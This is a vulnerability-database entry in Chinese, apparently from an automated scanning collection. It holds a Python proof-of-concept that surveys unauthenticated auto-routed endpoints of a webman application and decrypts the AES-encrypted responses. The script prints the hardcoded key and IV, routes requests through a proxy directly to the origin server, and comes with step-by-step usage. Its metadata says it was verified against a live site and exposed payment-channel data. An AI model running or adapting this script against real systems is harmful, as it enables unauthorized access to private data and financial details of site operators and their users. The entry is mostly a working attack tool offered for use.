# webman 自动路由未授权接口普查 + Crypto 硬编码密钥解密响应

- **code**: webman-自动路由未授权接口普查-crypto-硬编码密钥解密响应
- **kind**: script
- **category**: info-leak
- **component**: webman
- **severity**: high
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-12 在 example.com（源站 203.0.113.95）实测：零凭证 GET /api/recharge/methods 经代理 127.0.0.1:7892 + --connect-to 后返回 200/X-Encrypted:1/1816 字节，解密得到含真实 TRC20 地址的充值渠道全量数据。
- **path**: pocs/webman-自动路由未授权接口普查-crypto-硬编码密钥解密响应/webman_autoroute_unauth_probe.py
- **tags**: webman,未授权,自动路由,信息泄露,AES硬编码
- **created_at**: 2026-10-12T11:52:04.170Z
- **found_by**: vuln-scan

## 描述

webman 默认自动路由 /{controller}/{action} 不挂路由级 AuthMiddleware：控制器方法体内只要没有 $request->userId 判定就完全免鉴权。响应被 Crypto 中间件 AES-256-CBC 加密（X-Encrypted: 1），但密钥硬编码在源码 app/Utils/Crypto.php 里，可离线解密，加密形同虚设。关键点：解析响应时必须跳过 HTTP 代理的 CONNECT 块，取最后一个 HTTP/1.1 状态行，否则状态码全部误判为 200。

## 用法

```
1) clone 源码，grep 出所有「方法体内无 $request->userId / admin() / Auth::」判定的控制器方法；2) 按 /api/<首字母小写的控制器名去掉 Controller>/<方法名> 拼自动路由；3) 逐条零凭证 GET，间隔 ≥1.6s；4) 响应若是 base64（X-Encrypted: 1），用 AES-256-CBC + key=QD2024SecretKey1234567890ABCDEF0 / iv=QD2024IV12345678 解密。注意：curl 走 HTTP 代理时输出含 CONNECT 块，必须取最后一个 HTTP/1.1 状态行做解析。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""webman 自动路由未授权接口普查 + 响应解密"""
import subprocess, re, base64, json
PROXY="http://127.0.0.1:7892"; SRC="203.0.113.95"
KEY=b"QD2024SecretKey1234567890ABCDEF0"; IV=b"QD2024IV12345678"
from Crypto.Cipher import AES

def call(vh, path, method="GET", body=None):
    cmd=["curl.exe","-x",PROXY,"-k","-s","-i","--max-time","22",
         "--connect-to","%s:443:%s:443"%(vh,SRC),"-X",method,
         "-H","User-Agent: Mozilla/5.0","-H","X-Requested-With: XMLHttpRequest"]
    if body is not None: cmd+=["-H","Content-Type: application/json","--data-binary",body]
    cmd.append("https://%s%s"%(vh,path))
    r=subprocess.run(cmd,capture_output=True,timeout=40).stdout.decode("utf-8","replace")
    t=r.replace("\r\n","\n")
    bs=re.split(r"(?m)^HTTP/1\.1 (\d{3})",t)          # 跳过代理 CONNECT 块，取最后一个真实状态行
    code=bs[-2] if len(bs)>=3 else "?"
    body_out=bs[-1].partition("\n\n")[2].strip() if len(bs)>=3 else t
    dec=None
    if re.fullmatch(r"[A-Za-z0-9+/=]{16,}", body_out or ""):
        raw=base64.b64decode(body_out)
        if raw and len(raw)%16==0:
            o=AES.new(KEY,AES.MODE_CBC,IV).decrypt(raw); p=o[-1]
            if 1<=p<=16: o=o[:-p]
            s=o.decode("utf-8","replace")
            if s.lstrip()[:1] in "{[": dec=s
    return code, body_out, dec

# 用法：把源码里所有「无 $request->userId 判定」的控制器方法名按 /api/<controller>/<action> 形式批量探测
for p in ["/api/collector/status","/api/recharge/methods","/api/game/platforms",
          "/api/yuebao/config","/api/levelReward/getLevelConfigs","/api/index/index",
          "/api/account/balance"]:
    c,b,d=call("example.com",p)
    print(c,p,"->",(d or b)[:160])

```
